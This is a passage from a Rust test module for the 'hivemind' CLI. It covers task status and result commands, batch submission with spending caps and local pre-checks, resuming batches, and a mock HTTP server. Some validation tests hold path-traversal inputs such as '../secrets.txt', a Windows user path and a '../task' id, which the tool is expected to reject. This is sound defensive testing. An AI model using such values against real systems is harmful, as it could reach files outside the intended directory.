            "http://localhost:8082/".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
        ];
        let status = match parse_cli_args(&status_args).expect("status args should parse") {
            CliCommand::Status(command) => command,
            _ => panic!("expected status command"),
        };
        assert_eq!(status.api_base, "http://localhost:8082");
        assert_eq!(status.task_id, "task-123");
        assert_eq!(status.username, "alice");
        assert_eq!(status.password, "secret");

        let result_args = vec![
            "hivemind".to_string(),
            "result".to_string(),
            "task-123".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
        ];
        let result = match parse_cli_args(&result_args).expect("result args should parse") {
            CliCommand::Result(command) => command,
            _ => panic!("expected result command"),
        };
        assert_eq!(result.api_base, "http://localhost:8082");
        assert_eq!(result.task_id, "task-123");
        assert_eq!(result.artifact_key, None);

        let download_args = vec![
            "hivemind".to_string(),
            "result".to_string(),
            "task-123".to_string(),
            "--download".to_string(),
            "--artifact-key".to_string(),
            "stdout artifact".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
        ];
        let download = match parse_cli_args(&download_args).expect("download args should parse") {
            CliCommand::Result(command) => command,
            _ => panic!("expected result command"),
        };
        assert!(download.download);
        assert_eq!(download.artifact_key.as_deref(), Some("stdout artifact"));
        assert_eq!(
            artifact_download_url(&download),
            "http://localhost:8082/api/tasks/task-123/artifact/download?artifact_key=stdout%20artifact"
        );
    }

    #[test]
    fn result_download_rejects_dot_task_id() {
        let args = vec![
            "hivemind".to_string(),
            "result".to_string(),
            ".".to_string(),
            "--download".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
        ];

        let err = parse_cli_args(&args).expect_err("dot task id should be rejected");
        assert!(err.to_string().contains("task id"));
    }

    #[test]
    fn artifact_download_filename_rejects_paths_from_content_disposition() {
        assert_eq!(
            artifact_filename_from_content_disposition(Some("attachment; filename=\"result.zip\""))
                .expect("plain filenames should be accepted"),
            "result.zip"
        );
        assert_eq!(
            artifact_filename_from_content_disposition(None)
                .expect("missing header should fall back to default filename"),
            "artifact.bin"
        );

        assert!(artifact_filename_from_content_disposition(Some(
            "attachment; filename=\"../secrets.txt\""
        ))
        .is_err());
        assert!(artifact_filename_from_content_disposition(Some(
            "attachment; filename=\"..\\secrets.txt\""
        ))
        .is_err());
        assert!(artifact_filename_from_content_disposition(Some(
            "attachment; filename=\"C:\\Users\\user\\secrets.txt\""
        ))
        .is_err());
        assert!(
            artifact_filename_from_content_disposition(Some("attachment; filename=\"..\""))
                .is_err()
        );
    }

    #[test]
    fn artifact_download_filename_accepts_quoted_semicolon() {
        assert_eq!(
            artifact_filename_from_content_disposition(Some(
                "attachment; filename=\"report;final.zip\""
            ))
            .expect("quoted semicolon filenames should parse"),
            "report;final.zip"
        );
    }

    #[test]
    fn formats_task_status_and_result_responses() {
        let status = serde_json::json!({
            "success": true,
            "task_id": "task-123",
            "status": "COMPLETED",
            "status_message": "done",
            "output": "hello",
            "wall_time_ms": 42,
            "peak_memory_mb": 64
        });
        let status_text = format_task_status(&status).expect("status should format");
        assert!(status_text.contains("task-123"));
        assert!(status_text.contains("COMPLETED"));
        assert!(status_text.contains("hello"));

        let result = serde_json::json!({
            "success": true,
            "task_id": "task-123",
            "status": "COMPLETED",
            "result_torrent": "magnet:?xt=urn:btih:abc",
            "status_message": "done"
        });
        let result_text = format_task_result(&result).expect("result should format");
        assert!(result_text.contains("task-123"));
        assert!(result_text.contains("magnet:?xt=urn:btih:abc"));
    }

    #[test]
    fn status_and_result_reject_missing_auth_and_unsafe_task_ids() {
        let missing_auth = vec![
            "hivemind".to_string(),
            "status".to_string(),
            "task-123".to_string(),
        ];
        let err = parse_cli_args(&missing_auth).expect_err("auth flags should be required");
        assert!(err.to_string().contains("--username"));

        let unsafe_id = vec![
            "hivemind".to_string(),
            "result".to_string(),
            "../task".to_string(),
            "--username".to_string(),
            "alice".to_string(),
            "--password".to_string(),
            "secret".to_string(),
        ];
        let err = parse_cli_args(&unsafe_id).expect_err("unsafe task id should be rejected");
        assert!(err.to_string().contains("task id"));

        let missing_value = vec![
            "hivemind".to_string(),
            "status".to_string(),
            "task-123".to_string(),
            "--username".to_string(),
        ];
        let err = parse_cli_args(&missing_value).expect_err("missing flag value should fail");
        assert!(err.to_string().contains("missing value"));
    }

    #[test]
    fn formats_unsuccessful_and_partial_task_responses() {
        let failed = serde_json::json!({
            "success": false,
            "message": "Task not found"
        });
        let err = format_task_status(&failed).expect_err("unsuccessful status should fail");
        assert!(err.to_string().contains("Task not found"));

        let partial_result = serde_json::json!({
            "success": true,
            "task_id": "task-123",
            "status": "PENDING",
            "result_torrent": null,
            "status_message": null
        });
        let text = format_task_result(&partial_result).expect("partial result should format");
        assert!(text.contains("PENDING"));
        assert!(text.contains("Result torrent:"));
    }

    #[test]
    fn result_shows_the_output_of_a_managed_task() {
        let managed = serde_json::json!({
            "success": true,
            "task_id": "task-42",
            "status": "COMPLETED",
            "result_torrent": "",
            "status_message": "",
            "output": "42",
        });
        let text = format_task_result(&managed).expect("managed result should format");
        assert!(text.ends_with("\nOutput: 42"), "{text}");
    }

    #[test]
    fn batch_requires_a_total_budget_cap_and_inputs() {
        let base = |extra: &[&str]| {
            let mut args = vec![
                "hivemind".to_string(),
                "batch".to_string(),
                "sum.hcode".to_string(),
                "--inputs".to_string(),
                "inputs.jsonl".to_string(),
                "--username".to_string(),
                "alice".to_string(),
                "--password".to_string(),
                "secret".to_string(),
            ];
            args.extend(extra.iter().map(|value| value.to_string()));
            args
        };

        let err = parse_cli_args(&base(&[])).expect_err("a batch without a cap must not run");
        assert!(
            err.to_string().contains("--max-total-cpt is required"),
            "{err}"
        );

        let err = parse_cli_args(&base(&["--max-total-cpt", "0"]))
            .expect_err("a zero cap must be refused");
        assert!(err.to_string().contains("greater than 0"), "{err}");

        let err = parse_cli_args(&base(&["--max-total-cpt", "500", "--per-minute", "61"]))
            .expect_err("pacing above the submit limit must be refused");
        assert!(err.to_string().contains("--per-minute"), "{err}");

        let command = parse_cli_args(&base(&[
            "--max-total-cpt",
            "500",
            "--max-cpt-per-task",
            "100",
            "--out",
            "out.csv",
            "--task-prefix",
            "sweep-1",
        ]))
        .expect("a complete batch command should parse");
        match command {
            CliCommand::Batch(batch) => {
                assert_eq!(batch.source_path, "sum.hcode");
                assert_eq!(batch.inputs_path, "inputs.jsonl");
                assert_eq!(batch.max_total_cpt, 500);
                assert_eq!(batch.max_cpt_per_task, Some(100));
                assert_eq!(batch.out_path.as_deref(), Some("out.csv"));
                assert_eq!(batch.task_prefix.as_deref(), Some("sweep-1"));
                assert_eq!(batch.per_minute, 50);
            }
            other => panic!("expected a batch command, got {other:?}"),
        }
    }

    fn batch_command(extra: &[&str]) -> Result<BatchCommand> {
        let mut args: Vec<String> = [
            "hivemind",
            "batch",
            "sum.hmf",
            "--inputs",
            "inputs.jsonl",
            "--username",
            "alice",
            "--password",
            "secret",
        ]
        .iter()
        .map(|part| (*part).to_owned())
        .collect();
        args.extend(extra.iter().map(|part| (*part).to_owned()));
        match parse_cli_args(&args)? {
            CliCommand::Batch(batch) => Ok(batch),
            _ => panic!("expected batch command"),
        }
    }

    #[test]
    fn batch_pre_check_flags_parse() {
        let defaults = batch_command(&["--max-total-cpt", "500"]).unwrap();
        assert!(defaults.precheck);
        assert!(!defaults.skip_invalid);
        assert_eq!(defaults.replicas, None);

        let off = batch_command(&["--max-total-cpt", "500", "--no-precheck"]).unwrap();
        assert!(!off.precheck);

        let skip = batch_command(&[
            "--skip-invalid",
            "--max-total-cpt",
            "500",
            "--replicas",
            "5",
        ])
        .unwrap();
        assert!(skip.skip_invalid && skip.precheck);
        assert_eq!(skip.replicas, Some(5));

        let err = batch_command(&["--max-total-cpt", "500", "--no-precheck", "--skip-invalid"])
            .unwrap_err();
        assert!(err.to_string().contains("--skip-invalid needs"), "{err}");
        assert!(batch_command(&["--max-total-cpt", "500", "--replicas", "1"]).is_err());
    }

    #[test]
    fn batch_requests_carry_the_replica_policy_only_when_one_was_asked_for() {
        let plain = batch_command(&["--max-total-cpt", "500"]).unwrap();
        let body = batch_request_body(&plain, "1;", "{}");
        assert!(body.get("managed_replica_count").is_none());
        assert!(body.get("managed_quorum").is_none());

        let five = batch_command(&["--max-total-cpt", "500", "--replicas", "5"]).unwrap();
        let body = batch_request_body(&five, "1;", "{}");
        assert_eq!(
            body.get("managed_replica_count"),
            Some(&serde_json::json!(5))
        );
        assert_eq!(body.get("managed_quorum"), Some(&serde_json::json!(3)));
    }

    #[test]
    fn the_refusal_report_names_the_inputs_and_how_to_go_on() {
        let reasons: Vec<String> = (0..12).map(|n| format!("reason {n}")).collect();
        let refused: Vec<(usize, &String)> = reasons
            .iter()
            .enumerate()
            .map(|(index, reason)| (index * 2, reason))
            .collect();
        let text = refusal_report(&refused, 40);
        assert!(text.starts_with("12 of 40 inputs cannot run, so nothing was submitted:"));
        assert!(text.contains("\n  input 1: reason 0"));
        assert!(text.contains("\n  input 19: reason 9"));
        assert!(!text.contains("reason 10"), "{text}");
        assert!(text.contains("... and 2 more"));
        assert!(text.ends_with("pass --skip-invalid to submit the rest."));

        let one = refusal_report(&[(4, &reasons[0])], 5);
        assert!(!one.contains("more"));
    }

    #[test]
    fn refusals_stop_the_batch_unless_the_rest_may_go_ahead() {
        let all_fine: Vec<std::result::Result<i64, String>> = vec![Ok(82), Ok(122)];
        assert!(check_refusals(&all_fine, false).is_ok());

        let one_bad: Vec<std::result::Result<i64, String>> =
            vec![Ok(82), Err("runtime_error: x".into())];
        let error = check_refusals(&one_bad, false).unwrap_err().to_string();
        assert!(error.contains("1 of 2 inputs cannot run"), "{error}");
        assert!(check_refusals(&one_bad, true).is_ok());

        let all_bad: Vec<std::result::Result<i64, String>> = vec![Err("a".into()), Err("b".into())];
        let error = check_refusals(&all_bad, true).unwrap_err().to_string();
        assert!(error.contains("none of the 2 inputs can run"), "{error}");
    }

    #[test]
    fn the_plan_summary_states_the_caps_and_what_they_are_based_on() {
        let exact = batch_command(&["--max-total-cpt", "500"]).unwrap();
        let text = plan_summary("Batch", "t", &[82, 82], 0, 164, &exact, "t.csv");
        assert_eq!(
            text,
            "Batch t: 2 tasks at 82 CPT each, the exact need of each input from a local run, at most 164 CPT in total (cap 500). Results: t.csv"
        );
        let mixed = plan_summary("Batch", "t", &[82, 122], 1, 204, &exact, "t.csv");
        assert!(
            mixed.contains("2 tasks (1 inputs skipped) at 82 to 122 CPT each"),
            "{mixed}"
        );

        let fixed =
            batch_command(&["--max-total-cpt", "500", "--max-cpt-per-task", "100"]).unwrap();
        assert!(!plan_summary("Batch", "t", &[100], 0, 100, &fixed, "t.csv").contains("exact"));
        assert!(
            plan_summary("Resuming batch", "t", &[100], 0, 100, &fixed, "t.csv")
                .starts_with("Resuming batch t: 1 tasks at 100 CPT each")
        );
        let unchecked = batch_command(&["--max-total-cpt", "500", "--no-precheck"]).unwrap();
        assert!(!plan_summary("Batch", "t", &[100], 0, 100, &unchecked, "t.csv").contains("exact"));
    }

    #[test]
    fn a_pre_check_failure_row_has_no_task_to_look_up() {
        let row = BatchRow {
            index: 3,
            task_id: "t-0003".into(),
            input: "{}".into(),
            status: PRECHECK_FAILED.into(),
            output: String::new(),
            billed_cpt: None,
            message: "parse_error: x (line 1)".into(),
        };
        assert!(!row.is_open());
        assert!(row.was_never_accepted());
        let mut rows = vec![row];
        let mut snapshots = std::collections::HashMap::new();
        snapshots.insert(
            "t-0003".to_owned(),
            serde_json::json!({"status": "COMPLETED", "output": "stale"}),
        );
        apply_batch_snapshots(&mut rows, &snapshots);
        assert_eq!(rows[0].status, PRECHECK_FAILED);
        assert!(rows[0].output.is_empty());
        assert!(
            render_batch_csv(&rows).contains("t-0003,PRECHECK_FAILED,,,parse_error: x (line 1),{}")
        );
    }

    #[derive(Clone, Debug)]
    struct SeenRequest {
        method: String,
        path: String,
        body: serde_json::Value,
    }

    #[derive(Default)]
    struct MockState {
        quote_cpt: i64,
        /// Task id to its output, for tasks that exist on the network.
        tasks: std::collections::BTreeMap<String, String>,
        seen: Vec<SeenRequest>,
        /// Tasks created so far by `POST /api/tasks`.
        created: usize,
        /// After this many creations every further one fails with 503.
        fail_creates_after: Option<usize>,
        /// Tasks that exist but are missing from the list, as when the list lags behind.
        hidden: std::collections::BTreeSet<String>,
    }

    /// A stand-in for the Master HTTP API that records what a batch sends it.
    struct MockMaster {
        api: String,
        state: std::sync::Arc<std::sync::Mutex<MockState>>,
    }

    impl MockMaster {
        fn seen(&self) -> Vec<SeenRequest> {
            self.state.lock().unwrap().seen.clone()
        }

        fn submitted(&self) -> Vec<serde_json::Value> {
            self.seen()
                .into_iter()
                .filter(|request| request.method == "POST" && request.path == "/api/tasks")
                .map(|request| request.body)
                .collect()
        }

        fn quotes(&self) -> usize {
            self.seen()
                .iter()
                .filter(|request| request.path == "/api/tasks/quote")
                .count()
        }

        fn fail_creates_after(&self, count: Option<usize>) {
            self.state.lock().unwrap().fail_creates_after = count;
        }

        fn hide(&self, id: &str) {
            self.state.lock().unwrap().hidden.insert(id.to_owned());
        }
    }

    async fn read_mock_request(
        socket: &mut tokio::net::TcpStream,
    ) -> Option<(String, String, Vec<u8>)> {
        use tokio::io::AsyncReadExt;
        let mut buffer = Vec::new();
        let mut chunk = [0_u8; 4096];
        let header_end = loop {
            if let Some(position) = buffer.windows(4).position(|bytes| bytes == b"\r\n\r\n") {
                break position + 4;
            }
            let read = socket.read(&mut chunk).await.ok()?;
            if read == 0 {
                return None;
            }
            buffer.extend_from_slice(&chunk[..read]);
        };
        let head = String::from_utf8_lossy(&buffer[..header_end]).into_owned();
        let mut request_line = head.lines().next()?.split_whitespace();
        let method = request_line.next()?.to_owned();
        let target = request_line.next()?.to_owned();
        let content_length = head
            .lines()
            .find_map(|line| {
                let (name, value) = line.split_once(':')?;
                name.eq_ignore_ascii_case("content-length")
                    .then(|| value.trim().parse::<usize>().ok())
                    .flatten()
            })
            .unwrap_or(0);
        while buffer.len() < header_end + content_length {
            let read = socket.read(&mut chunk).await.ok()?;
            if read == 0 {
                break;
            }
            buffer.extend_from_slice(&chunk[..read]);
        }
        let end = (header_end + content_length).min(buffer.len());
        Some((method, target, buffer[header_end..end].to_vec()))
    }

    fn mock_reply(
        state: &mut MockState,
        method: &str,
        target: &str,
        body: &[u8],
    ) -> (u16, serde_json::Value) {
        let (path, query) = target.split_once('?').unwrap_or((target, ""));
        let json: serde_json::Value =
            serde_json::from_slice(body).unwrap_or(serde_json::Value::Null);
        state.seen.push(SeenRequest {
            method: method.to_owned(),
            path: path.to_owned(),
            body: json.clone(),
        });
        match (method, path) {
            ("POST", "/api/login") => (
                200,
                serde_json::json!({"success": true, "token": "mock-token"}),
            ),
            ("POST", "/api/tasks/quote") => (
                200,
                serde_json::json!({"success": true, "quoted_cpt": state.quote_cpt, "currency": "CPT"}),
            ),
            ("POST", "/api/tasks") => {
                let id = json["task_id"].as_str().unwrap_or_default().to_owned();
                if state
                    .fail_creates_after
                    .is_some_and(|limit| state.created >= limit)
                {
                    return (
                        503,
                        serde_json::json!({"success": false, "message": "master unavailable"}),
                    );
                }
                match state.tasks.entry(id) {
                    std::collections::btree_map::Entry::Occupied(_) => (
                        409,
                        serde_json::json!({"success": false, "message": "task_id already exists"}),
                    ),
                    std::collections::btree_map::Entry::Vacant(slot) => {
                        slot.insert("done".to_owned());
                        state.created += 1;
                        (201, serde_json::json!({"success": true, "message": "ok"}))
                    }
                }
            }
            ("GET", "/api/tasks") => {
                let ids = query
                    .split('&')
                    .find_map(|pair| pair.strip_prefix("task_ids="))
                    .unwrap_or_default()
                    .replace("%2C", ",");
                let tasks: Vec<serde_json::Value> = ids
                    .split(',')
                    .filter(|id| !state.hidden.contains(*id))
                    .filter_map(|id| {
                        state.tasks.get(id).map(|output| {
                            serde_json::json!({
                                "task_id": id,
                                "status": "COMPLETED",
                                "output": output,
                                "billed_amount": 10,
                                "status_message": "",
                            })
                        })
                    })
                    .collect();
                (200, serde_json::json!({"success": true, "tasks": tasks}))
            }
            _ => (
                404,
                serde_json::json!({"success": false, "message": "not mocked"}),
            ),
        }
    }

    async fn mock_master(quote_cpt: i64, existing: &[&str]) -> MockMaster {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let api = format!("http://{}", listener.local_addr().unwrap());
        let state = std::sync::Arc::new(std::sync::Mutex::new(MockState {
            quote_cpt,
            tasks: existing
                .iter()
                .map(|id| ((*id).to_owned(), "earlier".to_owned()))
                .collect(),
            ..MockState::default()
        }));
        let shared = std::sync::Arc::clone(&state);
        tokio::spawn(async move {
            use tokio::io::AsyncWriteExt;
            loop {
                let Ok((mut socket, _)) = listener.accept().await else {
                    return;
                };
                let Some((method, target, body)) = read_mock_request(&mut socket).await else {
                    continue;
                };
                let (status, reply) =
                    mock_reply(&mut shared.lock().unwrap(), &method, &target, &body);
                let payload = reply.to_string();
                let response = format!(
                    "HTTP/1.1 {status} Mock\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{payload}",
                    payload.len()
                );
                let _ = socket.write_all(response.as_bytes()).await;
            }
        });
        MockMaster { api, state }
    }

    const SUM_SOURCE: &str = "let total = 0;\nfor value in get(input, \"values\") {\n  let total = total + value;\n}\ntotal;";
    const INPUT_25: &str = "{\"values\":[10,20,30]}";
    const INPUT_37: &str = "{\"values\":[1,2,3,4,5,6]}";
    /// `for` over a number fails at run time.
    const INPUT_BROKEN: &str = "{\"values\":5}";

    struct BatchRun {
        result: Result<()>,
        csv: String,
    }

    async fn run_test_batch(master: &MockMaster, inputs: &[&str], extra: &[&str]) -> BatchRun {
        let dir = temp_batch_dir();
        let run = run_test_batch_in(master, &dir, SUM_SOURCE, inputs, extra).await;
        std::fs::remove_dir_all(&dir).ok();
        run
    }

    fn temp_batch_dir() -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "hivemind-batch-{}-{}",
            std::process::id(),
            uuid::Uuid::new_v4().simple()
        ));
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    /// Runs a batch whose files live in `dir`. Running again in the same `dir` sees the first
    /// run's results and state, which is how a resume is tested.
    async fn run_test_batch_in(
        master: &MockMaster,
        dir: &std::path::Path,
        source_text: &str,
        inputs: &[&str],
        extra: &[&str],
    ) -> BatchRun {
        let (source, list, out) = (
            dir.join("sum.hmf"),
            dir.join("inputs.jsonl"),
            dir.join("out.csv"),
        );
        std::fs::write(&source, source_text).unwrap();
        std::fs::write(&list, inputs.join("\n")).unwrap();
        let mut args: Vec<String> = [
            "hivemind",
            "batch",
            source.to_str().unwrap(),
            "--inputs",
            list.to_str().unwrap(),
            "--username",
            "alice",
            "--password",
            "secret",
            "--api",
            &master.api,
            "--out",
            out.to_str().unwrap(),
            "--task-prefix",
            "t",
            "--poll-secs",
            "1",
        ]
        .iter()
        .map(|part| (*part).to_owned())
        .collect();
        args.extend(extra.iter().map(|part| (*part).to_owned()));
        let CliCommand::Batch(mut command) = parse_cli_args(&args).unwrap() else {
            panic!("expected batch command");
        };
        // Pacing exists to stay under the Master's rate limit, which a mock does not have.
        command.per_minute = 60_000;
        // Waiting for a task that never shows up would otherwise take the default hour.
        command.timeout_secs = 1;
        let result = run_batch(command).await;
        let csv = std::fs::read_to_string(&out).unwrap_or_default();
        BatchRun { result, csv }
    }

    #[tokio::test]
    async fn batch_prices_each_input_from_its_own_run() {
        let master = mock_master(5, &[]).await;
        let run = run_test_batch(&master, &[INPUT_25, INPUT_37], &["--max-total-cpt", "300"]).await;
        run.result.unwrap();
        let submitted = master.submitted();
        assert_eq!(submitted.len(), 2);
        // 25 units: 3 x 25 + 7 fee. 37 units: 3 x 37 + 11 fee.
        assert_eq!(submitted[0]["max_cpt"], 82);
        assert_eq!(submitted[1]["max_cpt"], 122);
        assert_eq!(submitted[0]["task_id"], "t-0001");
        assert!(submitted[0].get("managed_replica_count").is_none());
        assert!(run.csv.contains("t-0001,COMPLETED"), "{}", run.csv);
        assert!(run.csv.contains("t-0002,COMPLETED"), "{}", run.csv);
    }

    #[tokio::test]
    async fn batch_stops_before_any_request_when_an_input_cannot_run() {
        let master = mock_master(5, &[]).await;
        let run = run_test_batch(
            &master,
            &[INPUT_25, INPUT_37, INPUT_BROKEN],
            &["--max-total-cpt", "300"],
        )
        .await;
        let error = run.result.unwrap_err().to_string();
        assert!(
            error.contains("1 of 3 inputs cannot run, so nothing was submitted"),
            "{error}"
        );
        assert!(error.contains("input 3:"), "{error}");
        assert!(error.contains("--skip-invalid"), "{error}");
        // The pre-check needs no network, so not even a sign-in happened.
        assert!(master.seen().is_empty(), "{:?}", master.seen());
        assert!(run.csv.is_empty());
    }

    #[tokio::test]
    async fn batch_skips_only_the_inputs_that_cannot_run_when_asked() {
        let master = mock_master(5, &[]).await;
        let run = run_test_batch(
            &master,
            &[INPUT_25, INPUT_BROKEN, INPUT_37],
            &["--max-total-cpt", "300", "--skip-invalid"],
        )
        .await;
        let error = run.result.unwrap_err().to_string();
        assert!(error.contains("1 of 3 tasks did not complete"), "{error}");
        let ids: Vec<String> = master
            .submitted()
            .iter()
            .map(|body| body["task_id"].as_str().unwrap().to_owned())
            .collect();
        assert_eq!(ids, vec!["t-0001", "t-0003"]);
        assert!(run.csv.contains("t-0002,PRECHECK_FAILED"), "{}", run.csv);
        assert!(run.csv.contains("t-0001,COMPLETED"), "{}", run.csv);
        assert!(run.csv.contains("t-0003,COMPLETED"), "{}", run.csv);
    }

    #[tokio::test]
    async fn batch_total_is_the_sum_of_the_exact_caps() {
        let master = mock_master(5, &[]).await;
        // 82 + 122 = 204.
        let run = run_test_batch(&master, &[INPUT_25, INPUT_37], &["--max-total-cpt", "203"]).await;
        let error = run.result.unwrap_err().to_string();
        assert!(
            error.contains("2 tasks can spend up to 204 CPT, above --max-total-cpt 203"),
            "{error}"
        );
        assert!(master.submitted().is_empty());

        let master = mock_master(5, &[]).await;
        run_test_batch(&master, &[INPUT_25, INPUT_37], &["--max-total-cpt", "204"])
            .await
            .result
            .unwrap();
        assert_eq!(master.submitted().len(), 2);
    }

    #[tokio::test]
    async fn batch_cap_is_never_below_the_resource_price() {
        let master = mock_master(200, &[]).await;
        run_test_batch(&master, &[INPUT_25], &["--max-total-cpt", "300"])
            .await
            .result
            .unwrap();
        assert_eq!(master.submitted()[0]["max_cpt"], 200);
    }

    #[tokio::test]
    async fn a_fixed_cap_refuses_inputs_that_need_more() {
        let master = mock_master(5, &[]).await;
        let run = run_test_batch(
            &master,
            &[INPUT_25, INPUT_37],
            &["--max-total-cpt", "300", "--max-cpt-per-task", "100"],
        )
        .await;
        let error = run.result.unwrap_err().to_string();
        assert!(
            error.contains("input 2: needs 122 CPT, above --max-cpt-per-task 100"),
            "{error}"
        );
        assert!(master.submitted().is_empty());

        let master = mock_master(5, &[]).await;
        run_test_batch(
            &master,
            &[INPUT_25],
            &["--max-total-cpt", "300", "--max-cpt-per-task", "100"],
        )
        .await
        .result
        .unwrap();
        assert_eq!(master.submitted()[0]["max_cpt"], 100);
    }

    #[tokio::test]
    async fn without_the_pre_check_every_task_gets_the_flat_cap() {
        let master = mock_master(5, &[]).await;
        let run = run_test_batch(
            &master,
            &[INPUT_25, INPUT_BROKEN],
            &["--max-total-cpt", "300", "--no-precheck"],
        )
        .await;
        // The broken input is not looked at; its task is submitted and the outcome is left to the network.
        run.result.unwrap();
        let caps: Vec<i64> = master
            .submitted()
            .iter()
            .map(|body| body["max_cpt"].as_i64().unwrap())
            .collect();
        assert_eq!(caps, vec![100, 100]);
    }

    #[tokio::test]
    async fn a_requested_replica_count_prices_the_cap_and_is_sent() {
        let master = mock_master(5, &[]).await;
        run_test_batch(
            &master,
            &[INPUT_25],
            &["--max-total-cpt", "300", "--replicas", "5"],
        )
        .await
        .result
        .unwrap();
        let body = &master.submitted()[0];
        // 5 x 25 = 125, plus a 12 CPT fee.
        assert_eq!(body["max_cpt"], 137);
        assert_eq!(body["managed_replica_count"], 5);
        assert_eq!(body["managed_quorum"], 3);
    }

    #[test]
    fn resuming_needs_the_prefix_that_names_the_batch() {
        let error = batch_command(&["--max-total-cpt", "500", "--resume"]).unwrap_err();
        assert!(
            error.to_string().contains("--resume needs --task-prefix"),
            "{error}"
        );
        let command =
            batch_command(&["--max-total-cpt", "500", "--resume", "--task-prefix", "t"]).unwrap();
        assert!(command.resume);
        assert!(!batch_command(&["--max-total-cpt", "500"]).unwrap().resume);
    }

    #[tokio::test]
    async fn a_new_batch_saves_its_plan_and_never_overwrites_another() {
        let master = mock_master(5, &[]).await;
        let dir = temp_batch_dir();
        run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &[INPUT_25, INPUT_37],
            &["--max-total-cpt", "300"],
        )
        .await
        .result
        .unwrap();
        let state: BatchState =
            serde_json::from_str(&std::fs::read_to_string(dir.join("out.csv.state.json")).unwrap())
                .unwrap();
        assert_eq!(state.prefix, "t");
        assert_eq!(state.rows.len(), 2);
        assert_eq!(state.rows[0].max_cpt, Some(82));
        assert_eq!(state.rows[1].max_cpt, Some(122));
        assert!(state.rows.iter().all(|row| row.skipped.is_none()));

        // The same batch again, without --resume, is refused before anything is sent.
        let before = master.seen().len();
        let again = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &[INPUT_25, INPUT_37],
            &["--max-total-cpt", "300"],
        )
        .await;
        let error = again.result.unwrap_err().to_string();
        assert!(error.contains("already exists: pass --resume"), "{error}");
        assert_eq!(master.seen().len(), before);
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn an_interrupted_batch_resumes_without_resubmitting_or_repricing() {
        let master = mock_master(5, &[]).await;
        let dir = temp_batch_dir();
        let inputs = [INPUT_25, INPUT_37, INPUT_25];

        // The Master goes away after the first task was created.
        master.fail_creates_after(Some(1));
        let first = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &inputs,
            &["--max-total-cpt", "400"],
        )
        .await;
        let error = first.result.unwrap_err().to_string();
        assert!(error.contains("2 of 3 tasks did not complete"), "{error}");
        assert!(first.csv.contains("t-0001,COMPLETED"), "{}", first.csv);
        assert!(first.csv.contains("t-0002,SUBMIT_FAILED"), "{}", first.csv);
        assert_eq!(master.submitted().len(), 3);
        assert_eq!(master.quotes(), 1);

        // It comes back. Only the two missing tasks are sent, with the caps the batch started with.
        master.fail_creates_after(None);
        let second = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &inputs,
            &["--max-total-cpt", "400", "--resume"],
        )
        .await;
        second.result.unwrap();
        let sent: Vec<(String, i64)> = master.submitted()[3..]
            .iter()
            .map(|body| {
                (
                    body["task_id"].as_str().unwrap().to_owned(),
                    body["max_cpt"].as_i64().unwrap(),
                )
            })
            .collect();
        assert_eq!(
            sent,
            vec![("t-0002".to_owned(), 122), ("t-0003".to_owned(), 82)]
        );
        assert_eq!(master.quotes(), 1, "a resume does not ask for a new quote");
        for id in ["t-0001", "t-0002", "t-0003"] {
            assert!(
                second.csv.contains(&format!("{id},COMPLETED")),
                "{}",
                second.csv
            );
        }
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn a_resume_keeps_the_inputs_the_pre_check_refused() {
        let master = mock_master(5, &[]).await;
        let dir = temp_batch_dir();
        let inputs = [INPUT_25, INPUT_BROKEN];
        let first = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &inputs,
            &["--max-total-cpt", "300", "--skip-invalid"],
        )
        .await;
        assert!(first.result.is_err());
        let state: BatchState =
            serde_json::from_str(&std::fs::read_to_string(dir.join("out.csv.state.json")).unwrap())
                .unwrap();
        assert!(state.rows[1].max_cpt.is_none());
        assert!(state.rows[1]
            .skipped
            .as_deref()
            .is_some_and(|reason| !reason.is_empty()));

        let second = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &inputs,
            &["--max-total-cpt", "300", "--skip-invalid", "--resume"],
        )
        .await;
        assert!(second.result.is_err());
        assert_eq!(
            master.submitted().len(),
            1,
            "the refused input is still not sent"
        );
        assert!(
            second.csv.contains("t-0002,PRECHECK_FAILED"),
            "{}",
            second.csv
        );
        assert!(second.csv.contains("t-0001,COMPLETED"), "{}", second.csv);
        std::fs::remove_dir_all(&dir).ok();
    }

    #[tokio::test]
    async fn a_resume_refuses_anything_that_differs_from_the_saved_batch() {
        let master = mock_master(5, &[]).await;
        let dir = temp_batch_dir();
        run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &[INPUT_25, INPUT_37],
            &["--max-total-cpt", "300"],
        )
        .await
        .result
        .unwrap();
        let sent = master.seen().len();

        let changed_input = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &[INPUT_25, INPUT_25],
            &["--max-total-cpt", "300", "--resume"],
        )
        .await;
        let error = changed_input.result.unwrap_err().to_string();
        assert!(
            error.contains("input 2 changed since the batch started"),
            "{error}"
        );

        let changed_source = run_test_batch_in(
            &master,
            &dir,
            "1;",
            &[INPUT_25, INPUT_37],
            &["--max-total-cpt", "300", "--resume"],
        )
        .await;
        let error = changed_source.result.unwrap_err().to_string();
        assert!(error.contains("the function source changed"), "{error}");

        let fewer = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &[INPUT_25],
            &["--max-total-cpt", "300", "--resume"],
        )
        .await;
        let error = fewer.result.unwrap_err().to_string();
        assert!(
            error.contains("the inputs file has 1 inputs; the batch started with 2"),
            "{error}"
        );

        let other_settings = run_test_batch_in(
            &master,
            &dir,
            SUM_SOURCE,
            &[INPUT_25, INPUT_37],
